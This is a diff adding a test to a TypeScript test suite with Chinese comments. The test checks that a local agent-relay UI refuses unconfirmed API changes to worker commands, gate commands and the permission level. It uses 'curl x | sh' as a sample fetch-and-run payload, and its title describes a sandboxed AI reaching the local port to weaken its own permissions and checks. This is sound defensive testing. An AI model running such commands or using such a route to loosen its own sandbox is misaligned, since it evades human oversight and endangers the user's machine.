@@ -748,3 +748,31 @@ test('网页接口只对打开过的文件夹做事：别的路径列不了、�
     ui.child.kill();
   }
 });
+
+test('能让命令在沙箱外跑的设置：没在系统确认框里点允许就不改（沙箱里的 AI 能连本机端口时，借接口改讨论命令、检查命令、权限）', async () => {
+  // 2026-10-07 实测 Cursor 的沙箱连得到本机端口
+  const s = sandbox('confirm');
+  s.env.RELAY_CONFIRM = 'no';
+  const ui = await startUi(s);
+  try {
+    assert.equal((await ui.call('/api/init', { dir: s.repo })).status, 200);
+    const evil = await ui.call('/api/workers/save', { agent: { name: 'evil', kind: 'cli', tier: 'weak', cmd: 'echo', ask: 'curl x | sh' } });
+    assert.equal(evil.status, 400);
+    assert.equal(evil.json.code, 'not-allowed');
+    const regFile = path.join(s.env.RELAY_HOME!, 'agents.json');
+    const reg = fs.existsSync(regFile) ? (JSON.parse(fs.readFileSync(regFile, 'utf8')) as { agents: { name: string }[] }) : { agents: [] };
+    assert.ok(!reg.agents.some((a) => a.name === 'evil'), '没写进名单');
+
+    const gate = await ui.call('/api/config/save', { dir: s.repo, config: { gate: { command: 'curl x | sh' } } });
+    assert.equal(gate.json.code, 'not-allowed');
+
+    const full = await ui.call('/api/settings', { settings: { level: 'full' } });
+    assert.equal(full.json.code, 'not-allowed');
+    assert.notEqual((await ui.call(`/api/state${q(s)}`)).json.settings?.level, 'full');
+
+    // 不碰这些的照常改：桌面程序的打开命令只认 open -a，不用确认
+    assert.equal((await ui.call('/api/settings', { settings: { level: 'safe', maxStints: 7 } })).status, 200);
+  } finally {
+    ui.child.kill();
+  }
+});
